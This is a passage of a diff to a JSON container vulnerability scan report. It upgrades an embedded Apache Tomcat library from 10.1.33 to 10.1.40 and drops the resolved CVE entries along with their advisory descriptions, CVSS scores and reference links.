-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT",
-          "Description": "Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nIf all of the following were true, a malicious user was able to view       security sensitive files and/or inject content into those files:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads\n- attacker knowledge of the names of security sensitive files being uploaded\n- the security sensitive files also being uploaded via partial PUT\n\nIf all of the following were true, a malicious user was able to       perform remote code execution:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- application was using Tomcat's file based session persistence with the default storage location\n- application included a library that may be leveraged in a deserialization attack\n\nUsers are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.",
-          "Severity": "CRITICAL",
-          "CweIDs": [
-            "CWE-44",
-            "CWE-502",
-            "CWE-706"
-          ],
-          "VendorSeverity": {
-            "alma": 2,
-            "amazon": 3,
-            "bitnami": 4,
-            "ghsa": 4,
-            "nvd": 4,
-            "oracle-oval": 2,
-            "photon": 4,
-            "redhat": 2,
-            "rocky": 2,
-            "ubuntu": 3
-          },
-          "CVSS": {
-            "bitnami": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-              "V3Score": 10
-            },
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
-              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:A",
-              "V3Score": 9.8,
-              "V40Score": 9.2
-            },
-            "nvd": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 9.8
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
-              "V3Score": 8.6
-            }
-          },
-          "References": [
-            "http://www.openwall.com/lists/oss-security/2025/03/10/5",
-            "https://access.redhat.com/errata/RHSA-2025:3645",
-            "https://access.redhat.com/errata/RHSA-2025:3683",
-            "https://access.redhat.com/security/cve/CVE-2025-24813",
-            "https://bugzilla.redhat.com/2332817",
-            "https://bugzilla.redhat.com/2351129",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2332817",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2351129",
-            "https://creativecommons.org/licenses/by/4.0/",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813",
-            "https://errata.almalinux.org/8/ALSA-2025-3683.html",
-            "https://errata.rockylinux.org/RLSA-2025:3645",
-            "https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md",
-            "https://github.com/apache/tomcat",
-            "https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c",
-            "https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72",
-            "https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc",
-            "https://linux.oracle.com/cve/CVE-2025-24813.html",
-            "https://linux.oracle.com/errata/ELSA-2025-7497.html",
-            "https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq",
-            "https://lists.debian.org/debian-lts-announce/2025/04/msg00003.html",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-24813",
-            "https://security.netapp.com/advisory/ntap-20250321-0001",
-            "https://security.netapp.com/advisory/ntap-20250321-0001/",
-            "https://ubuntu.com/security/notices/USN-7525-1",
-            "https://ubuntu.com/security/notices/USN-7525-2",
-            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
-            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-24813",
-            "https://www.cve.org/CVERecord?id=CVE-2025-24813",
-            "https://www.vicarius.io/vsociety/posts/cve-2025-24813-detect-apache-tomcat-rce",
-            "https://www.vicarius.io/vsociety/posts/cve-2025-24813-mitigate-apache-tomcat-rce",
-            "https://www.vicarius.io/vsociety/posts/cve-2025-24813-tomcat-detect-vulnerability",
-            "https://www.vicarius.io/vsociety/posts/cve-2025-24813-tomcat-mitigation-vulnerability"
-          ],
-          "PublishedDate": "2025-03-10T17:15:35.067Z",
-          "LastModifiedDate": "2026-06-17T08:59:39.593Z"
-        },
-        {
           "VulnerabilityID": "CVE-2026-41293",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41293",
@@ -581,16 +272,16 @@
         {
           "VulnerabilityID": "CVE-2026-43512",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-43512",
@@ -647,16 +338,16 @@
         {
           "VulnerabilityID": "CVE-2026-43515",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-43515",
@@ -716,16 +407,16 @@
         {
           "VulnerabilityID": "CVE-2026-65182",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.25, 10.1.58, 9.0.121",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-65182",
@@ -779,16 +470,16 @@
         {
           "VulnerabilityID": "CVE-2026-65905",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.25, 10.1.58, 9.0.121",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-65905",
@@ -836,16 +527,16 @@
         {
           "VulnerabilityID": "CVE-2026-68525",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.25, 10.1.58, 9.0.121",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-68525",
@@ -897,196 +588,18 @@
           "LastModifiedDate": "2026-08-27T15:15:02.453Z"
         },
         {
-          "VulnerabilityID": "CVE-2024-50379",
-          "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
-          },
-          "InstalledVersion": "10.1.33",
-          "FixedVersion": "11.0.2, 10.1.34, 9.0.98",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2024-50379",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "tomcat: RCE due to TOCTOU issue in JSP compilation",
-          "Description": "Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability during JSP compilation in Apache Tomcat permits an RCE on case insensitive file systems when the default servlet is enabled for write (non-default configuration).\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97.\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.\n\nUsers are recommended to upgrade to version 11.0.2, 10.1.34 or 9.0.98, which fixes the issue.",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-367"
-          ],
-          "VendorSeverity": {
-            "alma": 2,
-            "amazon": 3,
-            "bitnami": 4,
-            "ghsa": 3,
-            "oracle-oval": 2,
-            "photon": 4,
-            "redhat": 2,
-            "rocky": 2,
-            "ubuntu": 2
-          },
-          "CVSS": {
-            "bitnami": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 9.8
-            },
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U",
-              "V3Score": 9.8,
-              "V40Score": 7.2
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            }
-          },
-          "References": [
-            "http://www.openwall.com/lists/oss-security/2024/12/17/4",
-            "http://www.openwall.com/lists/oss-security/2024/12/18/2",
-            "https://access.redhat.com/errata/RHSA-2025:3645",
-            "https://access.redhat.com/errata/RHSA-2025:3683",
-            "https://access.redhat.com/security/cve/CVE-2024-50379",
-            "https://bugzilla.redhat.com/2332817",
-            "https://bugzilla.redhat.com/2351129",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2332817",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2351129",
-            "https://creativecommons.org/licenses/by/4.0/",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813",
-            "https://errata.almalinux.org/8/ALSA-2025-3683.html",
-            "https://errata.rockylinux.org/RLSA-2025:3645",
-            "https://github.com/apache/tomcat",
-            "https://github.com/apache/tomcat/commit/05ddeeaa54df1e2dc427d0164bedd6b79f78d81f",
-            "https://github.com/apache/tomcat/commit/05ddeeaa54df1e2dc427d0164bedd6b79f78d81f%20%2810.1.34%29",
-            "https://github.com/apache/tomcat/commit/43b507ebac9d268b1ea3d908e296cc6e46795c00",
-            "https://github.com/apache/tomcat/commit/43b507ebac9d268b1ea3d908e296cc6e46795c00%20%289.0.98%29",
-            "https://github.com/apache/tomcat/commit/631500b0c9b2a2a2abb707e3de2e10a5936e5d41",
-            "https://github.com/apache/tomcat/commit/631500b0c9b2a2a2abb707e3de2e10a5936e5d41%20%289.0.98%29",
-            "https://github.com/apache/tomcat/commit/684247ae85fa633b9197b32391de59fc54703842",
-            "https://github.com/apache/tomcat/commit/8554f6b1722b33a2ce8b0a3fad37825f3a75f2d2",
-            "https://github.com/apache/tomcat/commit/8554f6b1722b33a2ce8b0a3fad37825f3a75f2d2%20%2810.1.34%29",
-            "https://github.com/apache/tomcat/commit/cc7a98b57c6dc1df21979fcff94a36e068f4456c",
-            "https://linux.oracle.com/cve/CVE-2024-50379.html",
-            "https://linux.oracle.com/errata/ELSA-2025-3683.html",
-            "https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r",
-            "https://lists.debian.org/debian-lts-announce/2025/01/msg00009.html",
-            "https://nvd.nist.gov/vuln/detail/CVE-2024-50379",
-            "https://security.netapp.com/advisory/ntap-20250103-0003",
-            "https://security.netapp.com/advisory/ntap-20250103-0003/",
-            "https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.34",
-            "https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.2",
-            "https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.98",
-            "https://ubuntu.com/security/notices/USN-7705-1",
-            "https://www.cve.org/CVERecord?id=CVE-2024-50379"
-          ],
-          "PublishedDate": "2024-12-17T13:15:18.81Z",
-          "LastModifiedDate": "2026-06-17T08:04:20.61Z"
-        },
-        {
-          "VulnerabilityID": "CVE-2024-56337",
-          "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
-          },
-          "InstalledVersion": "10.1.33",
-          "FixedVersion": "11.0.2, 10.1.34, 9.0.98",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2024-56337",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "tomcat: Incomplete fix for CVE-2024-50379 - RCE due to TOCTOU issue in JSP compilation",
-          "Description": "Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nThe mitigation for CVE-2024-50379 was incomplete.\n\nUsers running Tomcat on a case insensitive file system with the default servlet write enabled (readonly initialisation \nparameter set to the non-default value of false) may need additional configuration to fully mitigate CVE-2024-50379 depending on which version of Java they are using with Tomcat:\n- running on Java 8 or Java 11: the system property sun.io.useCanonCaches must be explicitly set to false (it defaults to true)\n- running on Java 17: the system property sun.io.useCanonCaches, if set, must be set to false (it defaults to false)\n- running on Java 21 onwards: no further configuration is required (the system property and the problematic cache have been removed)\n\nTomcat 11.0.3, 10.1.35 and 9.0.99 onwards will include checks that sun.io.useCanonCaches is set appropriately before allowing the default servlet to be write enabled on a case insensitive file system. Tomcat will also set sun.io.useCanonCaches to false by default where it can.",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-367"
-          ],
-          "VendorSeverity": {
-            "alma": 3,
-            "amazon": 3,
-            "bitnami": 4,
-            "ghsa": 3,
-            "oracle-oval": 3,
-            "photon": 4,
-            "redhat": 2,
-            "rocky": 3,
-            "ubuntu": 2
-          },
-          "CVSS": {
-            "bitnami": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 9.8
-            },
-            "ghsa": {
-              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U",
-              "V40Score": 7.2
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            }
-          },
-          "References": [
-            "https://access.redhat.com/errata/RHSA-2025:11333",
-            "https://access.redhat.com/errata/RHSA-2025:11335",
-            "https://access.redhat.com/security/cve/CVE-2024-56337",
-            "https://bugzilla.redhat.com/2333521",
-            "https://bugzilla.redhat.com/2362783",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2333521",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2362783",
-            "https://creativecommons.org/licenses/by/4.0/",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56337",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31650",
-            "https://errata.almalinux.org/8/ALSA-2025-11333.html",
-            "https://errata.rockylinux.org/RLSA-2025:11335",
-            "https://github.com/apache/tomcat",
-            "https://linux.oracle.com/cve/CVE-2024-56337.html",
-            "https://linux.oracle.com/errata/ELSA-2025-11335.html",
-            "https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp",
-            "https://lists.debian.org/debian-lts-announce/2025/01/msg00009.html",
-            "https://nvd.nist.gov/vuln/detail/CVE-2024-56337",
-            "https://security.netapp.com/advisory/ntap-20250103-0002",
-            "https://security.netapp.com/advisory/ntap-20250103-0002/",
-            "https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.34",
-            "https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.2",
-            "https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.98",
-            "https://www.cve.org/CVERecord?id=CVE-2024-50379",
-            "https://www.cve.org/CVERecord?id=CVE-2024-56337"
-          ],
-          "PublishedDate": "2024-12-20T16:15:24.26Z",
-          "LastModifiedDate": "2026-06-17T08:12:04.293Z"
-        },
-        {
           "VulnerabilityID": "CVE-2025-48988",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.8, 10.1.42, 9.0.106",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-48988",
@@ -1180,16 +693,16 @@
         {
           "VulnerabilityID": "CVE-2025-48989",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.10, 10.1.44, 9.0.108",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-48989",
@@ -1283,16 +796,16 @@
         {
           "VulnerabilityID": "CVE-2025-52520",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.9, 10.1.43, 9.0.107",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-52520",
@@ -1381,16 +894,16 @@
         {
           "VulnerabilityID": "CVE-2025-53506",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.107, 10.1.43, 11.0.9",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-53506",
@@ -1479,16 +992,16 @@
         {
           "VulnerabilityID": "CVE-2025-55752",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.11, 10.1.45, 9.0.109",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-55752",
@@ -1568,16 +1081,16 @@
         {
           "VulnerabilityID": "CVE-2026-24734",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "11.0.18, 10.1.52, 9.0.115",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-24734",
@@ -1653,16 +1166,16 @@
         {
           "VulnerabilityID": "CVE-2026-24880",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.116, 10.1.52, 11.0.20",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
